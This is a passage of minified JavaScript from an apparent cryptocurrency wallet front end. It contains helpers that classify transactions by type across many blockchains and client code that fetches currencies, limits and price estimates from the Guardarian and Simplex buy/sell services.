          , isOneStaking = e => isOneDelegate(e) || isOneUnDelegate(e) || isOneReward(e)
          , isZilStaking = e => {
            var t, a, n;
            return null !== (t = null === (a = getExtra(e)) || void 0 === a || null === (n = a.data) || void 0 === n ? void 0 : n.includes("DelegateStake")) && void 0 !== t && t
        }
          , isZilWithdrawStakeAmt = e => {
            var t, a, n;
            return null !== (t = null === (a = getExtra(e)) || void 0 === a || null === (n = a.data) || void 0 === n ? void 0 : n.includes("WithdrawStakeAmt")) && void 0 !== t && t
        }
          , isZilCompleteWithdrawal = e => {
            var t, a, n;
            return null !== (t = null === (a = getExtra(e)) || void 0 === a || null === (n = a.data) || void 0 === n ? void 0 : n.includes("CompleteWithdrawal")) && void 0 !== t && t
        }
          , isZilWithdrawStakeRewards = e => {
            var t, a, n;
            return null !== (t = null === (a = getExtra(e)) || void 0 === a || null === (n = a.data) || void 0 === n ? void 0 : n.includes("WithdrawStakeRewards")) && void 0 !== t && t
        }
          , isQtumStake = e => {
            var t;
            return (null == e ? void 0 : e.vout) && (null == e || null === (t = e.vout) || void 0 === t ? void 0 : t.some((e => {
                var t, a;
                return (null == e || null === (t = e.scriptPubKey) || void 0 === t ? void 0 : t.hex) && (null == e || null === (a = e.scriptPubKey) || void 0 === a ? void 0 : a.hex.includes("0000000000000000000000000000000000000086"))
            }
            )))
        }
          , isExchange = e => "exchange" === e.type
          , isMultisig = e => "multisig" === e.type
          , isMultisigTxs = e => "multisig-txs" === e.type
          , isKmdClaim = e => e && e.addressTo === e.addressFrom && "0" === e.fee && "kmd" === e.currencyFrom
          , isXtzDelegation = e => {
            var t;
            return "delegation" === (null === (t = getExtra(e)) || void 0 === t ? void 0 : t.type) && "xtz" === e.currencyFrom
        }
          , isXtzStakingReward = e => {
            var t;
            return null !== (t = "tz1fTLiQ2bFzVJR4qzpu5nzuzDmc6mEpAUAJ" === e.addressFrom && e.isIncoming) && void 0 !== t && t
        }
          , isKinActivation = e => {
            var t;
            return "createAccount" === (null === (t = getExtra(e)) || void 0 === t ? void 0 : t.type)
        }
          , isNeoClaim = e => "claim" === e.addressFrom && "gas" === e.currencyFrom
          , isAtomUndelegate = e => "undelegate" === e.type && "atom" === e.family
          , isAtomDelegate = e => "delegate" === e.type && "atom" === e.family
          , isAtomReward = e => "reward" == e.type && "atom" === e.family
          , isFio = e => "fio-sent" === e.type || "fio-appruved" === e.type || "fio-pending" === e.type
          , isTrxStaking = e => "trx" === e.currencyFrom && !!e.contractType && [11, 54].includes(e.contractType)
          , isTrxClaiming = e => "trx" === e.currencyFrom && 13 === e.contractType
          , isTrxUnstaking = e => "trx" === e.currencyFrom && !!e.contractType && [12, 55].includes(e.contractType)
          , isTrxWithdrawUnfreezedStaking = e => "trx" === e.currencyFrom && 56 === e.contractType
          , isTrxDelegating = e => "trx" === e.currencyFrom && 57 === e.contractType
          , isTrxUndelegating = e => "trx" === e.currencyFrom && 58 === e.contractType
          , isTrxCancelUnstake = e => "trx" === e.currencyFrom && 59 === e.contractType
          , isTxNowFreeze = e => {
            var t;
            return "FREEZE_TOKEN" === (null === (t = getExtra(e)) || void 0 === t ? void 0 : t.type)
        }
          , isTxNowUnFreeze = e => {
            var t;
            return "UN_FREEZE_TOKEN" === (null === (t = getExtra(e)) || void 0 === t ? void 0 : t.type)
        }
          , isTxNowReward = e => "bnb12d3rdd5z7r6gef75gyxmh3c3sm2u88sp9jyrfh" === e.addressFrom
          , isAdaDelegation = e => "delegation" === e.type && "ada" === e.currencyFrom
          , isAdaWithdraw = e => "withdraw" === e.type && "ada" === e.currencyFrom
          , isXrpCloseAccount = e => "accountDelete" === e.type && !e.isIncoming
          , isOntFee = e => "ont" === e.family && "AFmseVrdL9f9oyCzZefL9tG6UbviEH9ugK" === e.addressTo
          , isRewardForRefProgr = e => "0x012FD777c45685C1957226F5c1b54FCF32b508d4" === e.addressFrom
          , isExtraAmount = e => {
            var t, a, n, r, l;
            return Boolean(isExchange(e) && (null === (t = getExtra(e)) || void 0 === t ? void 0 : t.amountReceiveInitial) && Number(null !== (a = null === (n = getExtra(e)) || void 0 === n ? void 0 : n.amountReceiveInitial) && void 0 !== a ? a : "NaN") < Number(null !== (r = null === (l = getExtra(e)) || void 0 === l ? void 0 : l.amountTo) && void 0 !== r ? r : "NaN"))
        }
          , isEthStaking = e => "0x0000000000000000000000000000000000000000" === e.addressFrom && ("ropsten" === e.family || "eth" === e.family) && "tseth" === e.currencyFrom && !e.primaryKey.includes("geth_deposit")
          , isGethDeposit = e => "0x0000000000000000000000000000000000000000" === e.addressFrom && ("ropsten" === e.family || "eth" === e.family) && !0 === e.isIncoming && ("tseth" === e.currencyFrom || "geth" === e.currencyFrom) && e.primaryKey.includes("geth")
          , isHbarAccountCreation = e => {
            var t;
            return "hbar" === e.family && "hbar" === e.currencyFrom && "CRYPTOCREATEACCOUNT" === (null === (t = getExtra(e)) || void 0 === t ? void 0 : t.type)
        }
          , isHbarUnknown = e => {
            var t;
            return "hbar" === e.family && "hbar" === e.currencyFrom && "CRYPTOTRANSFER" !== (null === (t = getExtra(e)) || void 0 === t ? void 0 : t.type) && !isHbarAccountCreation(e)
        }
          , isHbarBlockchainFeeTransaction = e => {
            var t;
            return ("hbar" === e.family || "hbar-testnet" === e.family) && "BLOCKCHAIN_SERVICE_FEE" === (null === (t = getExtra(e)) || void 0 === t ? void 0 : t.type)
        }
          , oc = (0,
        M.p1)() || (0,
        M.tq)()
          , getTxHash = e => e.hash
          , isFailedExchangeTx = e => {
            var t;
            return isExchange(e) && "failed" === (null === (t = getExtra(e)) || void 0 === t ? void 0 : t.status)
        }
          , isFinishedExchange = e => {
            var t;
            if (null !== (t = getExtra(e)) && void 0 !== t && t.status) {
                var a, n;
                return ["finished", "expired", "complete"].includes(null !== (a = null === (n = getExtra(e)) || void 0 === n ? void 0 : n.status) && void 0 !== a ? a : "undefined")
            }
            return !1
        }
          , isBuy = e => "buy" === e.type
          , isSell = e => "sell" === e.type
          , getTxHashLink = (e, t, a, n) => {
            var r;
            a && "bnbmainnet" === a.toLowerCase() && (a = "bnb");
            a && "usdt" === a.toLowerCase() && !n && (n = "btc");
            a && "usdc" === a.toLowerCase() && !n && (n = "eth");
            if (a && "usdterc20" === a.toLowerCase()) {
                a = "usdt";
                n || (n = "eth")
            }
            "ada-shelley" === n && (n = "ada");
            let l = a || e.currencyTo;
            isSell(e) && (l = e.currencyFrom);
            const s = (0,
            be.Kb)((n || e.family || "").toLowerCase(), (null !== (r = l) && void 0 !== r ? r : "").toLowerCase(), null != t ? t : "");
            return isOneStaking(e) ? s.replace("/tx/", "/staking-tx/") : s
        }
          , isSellKysStatus = e => {
            var t;
            return !e.addressTo || "kyc" === (null === (t = getExtra(e)) || void 0 === t ? void 0 : t.status)
        }
          , isSellInitialStatus = e => {
            var t;
            return "initial" === (null === (t = getExtra(e)) || void 0 === t ? void 0 : t.status)
        }
          , isSellPendingStatus = e => {
            var t;
            return "pending" === (null === (t = getExtra(e)) || void 0 === t ? void 0 : t.status)
        }
          , getSellPaymentStatus = e => {
            var t, a, n, r;
            return isSellKysStatus(e) || isSellInitialStatus(e) ? "KYC verification in progress" : isSellPendingStatus(e) ? "Action required" : "refund" === (null === (t = getExtra(e)) || void 0 === t ? void 0 : t.status) ? "Transaction refunded" : "reject" === (null === (a = getExtra(e)) || void 0 === a ? void 0 : a.status) ? "Transaction failed. Kindly contact support for refund" : "sent" === (null === (n = getExtra(e)) || void 0 === n ? void 0 : n.status) ? "Crypto transaction sent" : "success" === (null === (r = getExtra(e)) || void 0 === r ? void 0 : r.status) ? "Fiat funds sent to your card" : ""
        }
          , isErrorTx = e => {
            var t;
            if (isSell(e)) {
                var a, n;
                return ["refund", "reject"].includes(null !== (a = null === (n = getExtra(e)) || void 0 === n ? void 0 : n.status) && void 0 !== a ? a : "undefined")
            }
            if (isBuy(e)) {
                var r;
                return isBuyErrorStatus(null === (r = getExtra(e)) || void 0 === r ? void 0 : r.status)
            }
            if (isExchange(e)) {
                var l, s;
                return ["failed", "refunded", "expired"].includes(null !== (l = null === (s = getExtra(e)) || void 0 === s ? void 0 : s.status) && void 0 !== l ? l : "undefined")
            }
            return null !== (t = e.isError) && void 0 !== t && t
        }
          , isPendingTx = e => {
            if (isSell(e)) {
                var t, a;
                return ["initial", "pending", "sent", "kyc"].includes(null !== (t = null === (a = getExtra(e)) || void 0 === a ? void 0 : a.status) && void 0 !== t ? t : "undefined")
            }
            return isExchange(e) ? !isFinishedExchange(e) : !(0 !== e.confirmations && !e.isPending || e.isError)
        }
          , getTxFamily = e => {
            var t, a;
            return e.family || (e.extra && null !== (t = getExtra(e)) && void 0 !== t && t.familyFrom ? null === (a = getExtra(e)) || void 0 === a ? void 0 : a.familyFrom : null)
        }
          , getSimpleWalletObject = e => {
            const t = getTxFamily(e);
            return {
                currency: e.currencyFrom || e.currencyTx,
                family: t || e.currencyFrom || e.currencyTx
            }
        }
          , getSimpleWalletObjectForFee = e => {
            const t = undefined
              , a = getTxFamily(e) || e.currencyFrom || e.currencyTx;
            return {
                currency: a,
                family: a
            }
        }
          , getSimpleWalletObjectBuyTo = e => {
            var t, a;
            return {
                currency: null === (t = e.currencyTo) || void 0 === t ? void 0 : t.toLowerCase(),
                family: null === (a = e.currencyTo) || void 0 === a ? void 0 : a.toLowerCase()
            }
        }
          , getUniqueGethDepositTxs = e => {
            const t = new Map
              , a = undefined;
            e.filter((e => isEthStaking(e))).map((e => ({
                ...e,
                timestamp: e.timestamp - 1,
                primaryKey: e.primaryKey.concat("geth_deposit")
            }))).forEach((e => {
                t.set(e.primaryKey, e)
            }
            ));
            return [...t.values()]
        }
        ;
        var cc = a(69470);
        const paymentPerformanceTx = e => {
            let {partner: t, paymentCreateTransaction: a, txPerformance: n} = e;
            const r = "buy" === (null == a ? void 0 : a.side) ? cc.d.PERFORMANCE_TX_BUY : cc.d.PERFORMANCE_TX_SELL
              , l = JSON.stringify({
                partner: t,
                paymentCreateTransaction: a
            });
            cc.$.send(r, l, `${n} ms`)
        }
          , paymentSuccess = e => {
            let {partner: t, paymentCreateTransaction: a} = e;
            const n = "buy" === (null == a ? void 0 : a.side) ? cc.d.BUY_SUCCESS : cc.d.SELL_SUCCESS
              , r = "buy" === (null == a ? void 0 : a.side) ? ge.d.BUYSELL_BUY_CREATE_TRANSACTION_SUCCESS : ge.d.BUYSELL_SELL_CREATE_TRANSACTION_SUCCESS
              , l = {
                partner: t,
                ...a
            };
            ge.b.success(r, l, "false", l);
            cc.$.send(n, JSON.stringify(l))
        }
          , paymentError = e => {
            let {partner: t, paymentCreateTransaction: a, error: n} = e;
            if ("ERR_CANCELED" === (null == n ? void 0 : n.code))
                return;
            const r = "buy" === (null == a ? void 0 : a.side) ? cc.d.BUY_ERROR : cc.d.SELL_ERROR
              , l = "buy" === (null == a ? void 0 : a.side) ? ge.d.BUYSELL_BUY_CREATE_TRANSACTION_ERROR : ge.d.BUYSELL_SELL_CREATE_TRANSACTION_ERROR
              , s = {
                partner: t,
                ...a,
                error: n
            };
            ge.b.error(l, s, n, s);
            cc.$.send(r, JSON.stringify(s))
        }
          , paymentGetLimitsError = e => {
            let {partner: t, paymentCreateTransaction: a, error: n} = e;
            if ("ERR_CANCELED" === (null == n ? void 0 : n.code))
                return;
            const r = "buy" === (null == a ? void 0 : a.side) ? ge.d.BUYSELL_BUY_GET_LIMITS_ERROR : ge.d.BUYSELL_SELL_GET_LIMITS_ERROR
              , l = {
                partner: t,
                ...a,
                error: n
            };
            ge.b.error(r, l, n, l)
        }
          , paymentGetEstimateError = e => {
            let {partner: t, paymentCreateTransaction: a, error: n} = e;
            if ("ERR_CANCELED" === (null == n ? void 0 : n.code))
                return;
            const r = "buy" === (null == a ? void 0 : a.side) ? ge.d.BUYSELL_BUY_GET_ESTIMATE_ERROR : ge.d.BUYSELL_SELL_GET_ESTIMATE_ERROR
              , l = {
                partner: t,
                ...a,
                error: n
            };
            ge.b.error(r, l, n, l)
        }
        ;
        function isResponseError(e) {
            return Boolean(e) && "object" == typeof e && e.error
        }
        const isCoin = e => {
            const {networks: t} = e;
            return t.some((t => t.network === e.ticker))
        }
          , getGuardarianCurrencies = async e => {
            let {abortController: t} = e;
            try {
                const e = await U.w.get("/api/v1/payment/guardarian/currencies", {
                    signal: null == t ? void 0 : t.signal
                });
                if (isResponseError(e.data))
                    throw new Error(`${e.data.status}${e.data.message && e.data.message}`);
                const a = e.data.fiat_currencies.map((e => e.ticker.toLowerCase()))
                  , n = e.data.crypto_currencies.filter((e => !e.networks.length || isCoin(e))).map((e => "BNBBSC" === e.ticker ? "bsc" : e.ticker.toLowerCase()))
                  , r = undefined;
                return {
                    fiatList: a,
                    coinList: n,
                    tokenList: e.data.crypto_currencies.filter((e => e.networks.length)).reduce(( (e, t) => {
                        t.networks.forEach((t => {
                            const a = (0,
                            be.Ay)(t.network.toLowerCase());
                            e[a] || (e[a] = []);
                            t.token_contract && (e[a] = [...e[a], t.token_contract.toLowerCase()])
                        }
                        ));
                        return e
                    }
                    ), {})
                }
            } catch (e) {
                console.warn(e);
                return {
                    fiatList: [],
                    coinList: [],
                    tokenList: {}
                }
            }
        }
          , getGuardarianCurrenciesSell = async e => {
            let {abortController: t, side: a} = e;
            const {coinList: n, tokenList: r} = await getGuardarianCurrencies({
                abortController: t,
                side: a
            });
            return {
                fiatList: ["eur", "gbp"],
                coinList: n,
                tokenList: r
            }
        }
          , getGuardarianLimits = async e => {
            let {paymentCreateTransaction: {currencyFrom: t, currencyTo: a, networkTo: n, networkFrom: r, side: l, amount: s}, abortController: i} = e;
            const o = "buy" === l ? a : t
              , c = "buy" === l ? n : r
              , u = Gl("guardarian", {
                currency: null == o ? void 0 : o.toLowerCase(),
                family: (null == c ? void 0 : c.toLowerCase()) || o.toLowerCase()
            })
              , handlePaymentGetLimitsError = (e, i, o) => {
                "ont" !== a && "xdc" !== a && "bnb" !== a && "kcs" !== a && "rfuel" !== a ? paymentGetLimitsError({
                    partner: "guardarian",
                    paymentCreateTransaction: {
                        amount: s,
                        currencyFrom: t,
                        currencyTo: (null == i ? void 0 : i.toUpperCase()) || a,
                        networkTo: (null == o ? void 0 : o.toUpperCase()) || n,
                        networkFrom: r,
                        side: l
                    },
                    error: e
                }) : console.log(e)
            }
              , makeRequest = async function() {
                let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : 1;
                try {
                    var s, o, c, d;
                    const {data: e} = await U.w.get("/api/v1/payment/guardarian/minmax", {
                        signal: null == i ? void 0 : i.signal,
                        params: {
                            currencyFrom: "buy" === l ? t : null == u || null === (s = u.currency) || void 0 === s ? void 0 : s.toUpperCase(),
                            networkFrom: "buy" === l ? r : null == u || null === (o = u.family) || void 0 === o ? void 0 : o.toUpperCase(),
                            currencyTo: "buy" === l ? null == u || null === (c = u.currency) || void 0 === c ? void 0 : c.toUpperCase() : a,
                            networkTo: "buy" === l ? null == u || null === (d = u.family) || void 0 === d ? void 0 : d.toUpperCase() : n
                        },
                        timeout: 2e4
                    });
                    if (isResponseError(e))
                        throw new Error(`${e.status}${e.message && e.message}`);
                    if (e && e.max)
                        return {
                            min: e.min,
                            max: e.max
                        }
                } catch (t) {
                    if (e < 3)
                        return makeRequest(e + 1);
                    console.error("err", t);
                    handlePaymentGetLimitsError(t, null == u ? void 0 : u.currency, null == u ? void 0 : u.family)
                }
                return null
            };
            return makeRequest()
        }
          , getGuardarianEstimate = async e => {
            let {paymentCreateTransaction: {amount: t, currencyFrom: a, currencyTo: n, networkTo: r, networkFrom: l, side: s}, abortController: i} = e;
            const o = "buy" === s ? n : a
              , c = "buy" === s ? r : l
              , u = Gl("guardarian", {
                currency: o.toLowerCase(),
                family: (null == c ? void 0 : c.toLowerCase()) || o.toLowerCase()
            });
            try {
                var d, m, p, f, E;
                const {data: e} = await U.w.get("/api/v1/payment/guardarian/estimate", {
                    signal: null == i ? void 0 : i.signal,
                    params: {
                        amount: t,
                        currencyFrom: "buy" === s ? a : null == u || null === (d = u.currency) || void 0 === d ? void 0 : d.toUpperCase(),
                        networkFrom: "buy" === s ? l : null == u || null === (m = u.family) || void 0 === m ? void 0 : m.toUpperCase(),
                        currencyTo: "buy" === s ? null == u || null === (p = u.currency) || void 0 === p ? void 0 : p.toUpperCase() : n,
                        networkTo: "buy" === s ? null == u || null === (f = u.family) || void 0 === f ? void 0 : f.toUpperCase() : r
                    }
                });
                if (isResponseError(e)) {
                    var h;
                    throw new Error(null === (h = e.status) || void 0 === h ? void 0 : h.toString())
                }
                return {
                    estimate: null == e ? void 0 : e.value,
                    rate: null == e ? void 0 : e.estimated_exchange_rate,
                    fee: null == e || null === (E = e.network_fee) || void 0 === E ? void 0 : E.amount,
                    partner: "guardarian"
                }
            } catch (e) {
                if ("ont" !== n && "xdc" !== n && "bnb" !== n && "kcs" !== n && "rfuel" !== n) {
                    var g, y;
                    paymentGetEstimateError({
                        partner: "guardarian",
                        paymentCreateTransaction: {
                            amount: t,
                            currencyFrom: a,
                            networkFrom: l,
                            side: s,
                            currencyTo: null == u || null === (g = u.currency) || void 0 === g ? void 0 : g.toUpperCase(),
                            networkTo: (null == u || null === (y = u.family) || void 0 === y ? void 0 : y.toUpperCase()) || r
                        },
                        error: e
                    })
                } else
                    console.log(e);
                return null
            }
        }
          , createGuardarianTransaction = async e => {
            let {amount: t, currencyFrom: a, currencyTo: n, networkFrom: r, networkTo: l, payoutAddress: s, side: i} = e;
            const o = Gl("guardarian", {
                currency: n.toLowerCase(),
                family: (null == l ? void 0 : l.toLowerCase()) || n.toLowerCase()
            }).currency
              , c = undefined
              , u = {
                currencyTo: o,
                networkTo: Gl("guardarian", {
                    currency: n.toLowerCase(),
                    family: (null == l ? void 0 : l.toLowerCase()) || n.toLowerCase()
                }).family || o,
                networkFrom: r,
                amount: t,
                currencyFrom: a.toUpperCase(),
                payoutAddress: s,
                side: i
            }
              , {data: d} = await U.w.post("/api/v1/payment/guardarian/transactions", u);
            if (isResponseError(d))
                throw new Error(`${d.status}${d.message && d.message}`);
            return d
        }
          , getGuardarianTransactionById = async e => {
            const {data: t} = await U.w.get(`/api/v1/payment/guardarian/transactions/${e}`);
            if (isResponseError(t))
                throw new Error(`${t.status}${t.message && t.message}`);
            return t
        }
          , getGuardarianTransactionByAddresses = async e => {
            if (!e.length)
                return [];
            const {data: t} = await U.w.post("/api/v1/payment/guardarian/searches/transactions", {
                payoutAddresses: e
            });
            if (isResponseError(t))
                throw new Error(`${t.status}${t.message && t.message}`);
            return t
        }
          , uc = (0,
        te.createAction)("@txs/ADD_TRANSACTION")()
          , dc = (0,
        te.createAction)("@txs/ADD_PENDING_TX")()
          , mc = (0,
        te.createAction)("@txs/ADD_EXCHANGE_TXS")()
          , pc = (0,
        te.createAction)("@txs/ADD_SELL_TXS")()
          , fc = (0,
        te.createAction)("@txs/ADD_BUY_TXS")()
          , Ec = (0,
        te.createAction)("@txs/ADD_MULTISIG_TXS")()
          , hc = (0,
        te.createAction)("@txs/ADD_FIO_TXS")()
          , gc = (0,
        te.createAction)("@txs/REMOVE_ALL_TXS")()
          , yc = (0,
        te.createAction)("@txs/REPLACE_TRANSACTIONS")();
        var vc = a(84944)
          , _c = a(33792)
          , wc = a(43090)
          , bc = a(55207)
          , kc = a(44431)
          , Sc = a.n(kc);
        const getSimplexFiats = async () => ["usd", "eur", "aud", "krw", "chf", "czk", "dkk", "nok", "nzd", "pln", "sek", "try", "zar", "huf", "ils", "inr", "hkd", "myr", "sgd", "bgn", "brl", "mxn", "aed", "ngn", "twd", "mad", "ron", "uah", "ars", "azn", "gbp", "cad", "clp", "cop", "crc", "dop", "gel", "idr", "jpy", "kzt", "mdl", "nad", "pen", "uyu", "php", "qar", "sar", "uzs", "vnd", "all", "amd", "ang", "bam", "bbd", "bdt", "bmd", "bnd", "bob", "bwp", "byn", "cny", "djf", "egp", "ghs", "gtq", "hnl", "hrk", "isk", "jmd", "kes", "kgs", "khr", "kyd", "lbp", "lkr", "mkd", "mnt", "mop", "mur", "mzn", "pab", "pgk", "pkr", "pyg", "rsd", "sos", "thb", "ttd", "tzs", "ugx", "xaf", "zmw"]
          , getSimplexCoins = async () => ["btc", "bch", "ltc", "eth", "xrp", "xlm", "atom", "trx", "bnb", "eos", "bsv", "qtum", "xem", "dgb", "doge", "xtz", "ada-shelley", "algo", "one", "hbar", "grs", "near", "xdc", "vet", "ada", "bsc", "zil", "avax-c", "matic", "ksm", "egld", "ethop", "etharb", "sol"]
          , getSimplexTokens = async () => ({
            eth: ["0x6b175474e89094c44da98b954eedeac495271d0f", "0x8e870d67f660d95d5be530380d0ec0bd388289e1", "0x4fabb145d64652a948d72533023f6e7a623c7c53", "0xdac17f958d2ee523a2206206994597c13d831ec7", "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48", "0xaaaebe6fe48e54f431b0c390cfaf0b017d09d42d", "0x1a3496c18d558bd9c6c8f609e1b129f67ab08163", "0xa2a54f1ec1f09316ef12c1770d32ed8f21b1fb6a", "0xf1290473e210b2108a85237fbcd7b6eb42cc654f", "0xdf574c24545e5ffecb9a659c229253d4111d87e1", "0x3845badade8e6dff049820680d1f14bd3903a5d0", "0x4922a015c4407f87432b179bb209e125432e4a2a", "0x1c48f86ae57291f7686349f12601910bd8d470bb", "0xddb3422497e61e13543bea06989c0789117555c5", "0x7fc66500c84a76ad7e9c93437bfc5ac33e2ddae9", "0x0000000000085d4780b73119b644ae5ecd22b376", "0x15d4c048f83bd7e37d49ea4c83a07267ec4203da", "0x1f9840a85d5af5bf1d1762f925bdaddc4201f984", "0xf34960d9d60be18cc1d5afc1a6f012a723a28811", "0xaf9f549774ecedbd0966c52f250acc548d3f36e5", "0xd13c7342e1ef687c5ad21b27c2b65d772cab5c8c", "0x0c93b616933b0cd03b201b29cd8a22681dd9e0d9", "0x45804880de22913dafe09f4980848ece6ecbaf78", "0x95ad61b0a150d79219dcf64e1e6cc01f0b64c4ce", "0x7d1afa7b718fb893db30a3abc0cfc608aacfebb0", "0xbb0e17ef65f82ab018d8edd776e8dd940327b28b", "0x514910771af9ca656af840dff83e8264ecf986ca", "0xc00e94cb662c3520282e6f5717214004a7f26888", "0x9f8f72aa9304c8b593d555f12ef6589cc3a579a2", "0x6b3595068778dd592e39a122f4f5a5cf09c90fe2", "0xf629cbd94d3791c9250152bd8dfbdf380e2a3b9c", "0x3506424f91fd33084466f402d5d97f05f8e3b4af", "0x0d8775f648430679a709e98d2b0cb6250d2887ef", "0x2260fac5e5542a773aa44fbcfedf7c193bc2c599", "0x728f30fa2f100742c7949d1961804fa8e0b1387d", "0x1f3f677ecc58f6a1f9e2cf410df4776a8546b5de", "0x7ddc52c4de30e94be3a6a0a2b259b2850f421989", "0xeeaa40b28a2d1b0b08f6f97bb1dd4b75316c6107", "0x557b933a7c2c45672b610f8954a3deb39a51a8ca", "0xdf49c9f599a0a9049d97cff34d0c30e468987389", "0x111111111117dc0aa78b770fa6a738034120c302", "0x761d38e5ddf6ccf6cf7c55759d5210750b5d60f3", "0x0f5d2fb29fb7d3cfee444a200298f468908cc942", "0xa0b73e1ff0b80914ab6fe0444e65848c4c34450b", "0x4d224452801aced8b2f0aebe155379bb5d594381", "0x5b7533812759b45c2b44c19e320ba2cd2681b542", "0x0d8775f648430679a709e98d2b0cb6250d2887ef", "0xbb0e17ef65f82ab018d8edd776e8dd940327b28b", "0xa0b73e1ff0b80914ab6fe0444e65848c4c34450b", "0x1abaea1f7c830bd89acc67ec4af516284b1bc33c", "0x15d4c048f83bd7e37d49ea4c83a07267ec4203da", "0xf34960d9d60be18cc1d5afc1a6f012a723a28811", "0x6f259637dcd74c767781e37bc6133cd6a68aa161", "0x6982508145454ce325ddbe47a25d4ec3d2311933", "0x163f8c2467924be0ae7b5347228cabf260318753"],
            bnb: ["ava-645"],
            trx: ["tvj7rnvhy6thbm7bwdse9g6gxwkhjhdnzs", "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t", "TAFjULxiVgT4qWk6UZwjqwZXTSaGaqnVp4", "TPYmHEhy5n8TCEfYGqW2rPxsghSfzghPDn", "TEkxiTehnzSmSe2XqrBj4w32RUN966rdz8"],
            bsc: ["0xe9e7cea3dedca5984780bafc599bd69add087d56", "0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d", "0xcf6bb5389c92bdda8a3747ddb454cb7a64626c63", "0xc732b6586a93b6b7cf5fed3470808bc74998224d", "0x0e09fabb73bd3ade0a17ecc321fd13a19e81ce82", "0xe02df9e3e622debdd69fb838bb799e3f168902c5", "0xc748673057861a797275cd8a068abb95a902e8de", "0xb036f689bd98b4bd3bd648fa09a23e54d839a859", "0x55d398326f99059ff775485246999027b3197955", "0x13616f44ba82d63c8c0dc3ff843d36a8ec1c05a9", "0xfb5b838b6cfeedc2873ab27866079ac55363d37e"],
            etharb: ["0x912ce59144191c1204e64559fe8253a0e49e6548", "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9", "0xfc5a1a6eb076a2c7ad06ed22c90d7e710e35ad0a"],
            ethop: ["0x4200000000000000000000000000000000000042", "0x94b008aa00579c1307b0ef2c499ad98a8ce58e58"],
            matic: ["0xc2132d05d31c914a87c6611c10748aeb04b58e8f", "0x2791bca1f2de4661ed88a30c99a7a9449aa84174", "0xcf32822ff397Ef82425153a9dcb726E5fF61DCA7"],
            sol: ["EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v", "Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB", "kinXdEcpDQeHPEuQnqmUgtYykqKGVFq6CeVX5iAHJq6"]
        })
          , Cc = undefined
          , getSimplexLimits = async e => {
            let {paymentCreateTransaction: t, abortController: a} = e;
            const n = null == t ? void 0 : t.currencyFrom
              , r = {
                min: "50",
                max: "20000"
            };
            if ("usd" === (null == n ? void 0 : n.toLowerCase()))
                return r;
            try {
                const {data: {response: e}} = await bc.w.get("/rates/fiats", {
                    signal: null == a ? void 0 : a.signal
                })
                  , t = null == e ? void 0 : e[(null == n ? void 0 : n.toLowerCase()) || ""];
                if (t) {
                    const e = .07;
                    return {
                        min: new (Sc())(r.min).multipliedBy(t).multipliedBy(1 + e).toString(),
                        max: new (Sc())(r.max).multipliedBy(t).multipliedBy(1 - e).toString()
                    }
                }
            } catch (e) {
                paymentGetLimitsError({
                    partner: "simplex",
                    paymentCreateTransaction: {
                        ...t
                    },
                    error: e
                })
            }
            return null
        }
          , getSimplexEstimate = async e => {
            let {paymentCreateTransaction: t, abortController: a} = e;
            const {amount: n, currencyTo: r, currencyFrom: l, networkTo: s, smartContract: i} = t
              , o = undefined
              , c = {
                amount: n,
                currencyTo: Gl("simplex", {
                    family: s || r,
                    currency: r,
                    smartContract: i
                }).currency.toLowerCase(),
                currencyFrom: l,
                type: "buy"
            };
            try {
                const {data: e} = await U.w.post("/api/v1/payment/simplex/get-estimate", c, {
                    signal: null == a ? void 0 : a.signal,
                    withCredentials: !0
                });
                return {
                    ...e,
                    partner: "simplex"
                }
            } catch (e) {
                paymentGetEstimateError({
                    partner: "simplex",
                    paymentCreateTransaction: {
                        ...t
                    },
                    error: e
                });
                throw e
            }
            return null
        }
          , getUserBuyQuoteTransaction = e => {
            let {currencyFrom: t, currencyTo: a, addressTo: n, amount: r, userAgent: l, networkTo: s, smartContract: i} = e;
            return async () => {
                try {
                    const e = Gl("simplex", {
                        family: s || a,
                        currency: a,
                        smartContract: i
                    }).currency
                      , o = {
                        currencyFrom: t,
                        currencyTo: e,
                        addressTo: n,
                        amount: r,
                        userAgent: l,
                        type: "buy"
                    }
                      , {data: c} = await U.w.post("/api/v1/payment/simplex/get-data", o, {
                        withCredentials: !0
                    });
                    return c
                } catch (e) {
                    throw e
                }
            }
        }
          , fetchTransactionById = e => async () => {
            const {data: t} = await U.w.post("/api/v1/payment/simplex/get-tx", {
                paymentId: e
            });
            return t
        }
          , Nc = ["simplex", "guardarian"]
          , Tc = {
            buy: {
                simplex: {
                    currencies: async () => ({
                        fiatList: await getSimplexFiats(),
                        tokenList: await getSimplexTokens(),
                        coinList: await getSimplexCoins()
                    }),
                    estimate: getSimplexEstimate,
                    limits: getSimplexLimits
                },
                guardarian: {
                    currencies: getGuardarianCurrencies,
                    estimate: getGuardarianEstimate,
                    limits: getGuardarianLimits
                }
            },
            sell: {
                simplex: {
                    currencies: async () => ({
                        fiatList: [],
                        coinList: [],
                        tokenList: {}
                    }),
                    estimate: async () => null,
                    limits: async () => ({
                        min: "0",
                        max: "0"
                    })
                },
                guardarian: {
                    currencies: getGuardarianCurrenciesSell,
                    estimate: getGuardarianEstimate,
                    limits: getGuardarianLimits
                }
            }
        }
          , getCurrencies = async e => {
            let {side: t, abortController: a} = e;
            const n = Tc[t]
              , r = Nc.map((async e => {
                var r;
                const l = undefined;
                return {
                    ...await (null === (r = n[e]) || void 0 === r ? void 0 : r.currencies({
                        side: t,
                        abortController: a
                    })),
                    name: e
                }
            }
            ))
              , l = await Promise.all(r)
              , s = undefined
              , i = undefined
              , o = undefined;
            return {
                fiatList: [...new Set(l.map((e => e.fiatList)).flat())],
                coinList: [...new Set(l.map((e => e.coinList)).flat())],
                tokenList: l.map((e => e.tokenList)).reduce(( (e, t) => (0,
                wc.Z)(( (e, t) => [...new Set([...e, ...t])]), e, t)), {}),
                partners: l
            }
        }
        ;
        var Ac = a(12002);
        let xc = null
          , Ic = null;
        const onStartUp = e => {
            ({dispatch: xc, getState: Ic} = e)
        }
          , getStoreManager = () => {
            const commitWalletUpdate = async e => {
                await xc(rd.updateWallet({
                    wallet: e
                }))
            }
              , updateBalance = async e => {
                await xc(setBalanceByWallet(e));
                if (e.subWallets)
                    for (const t of e.subWallets)
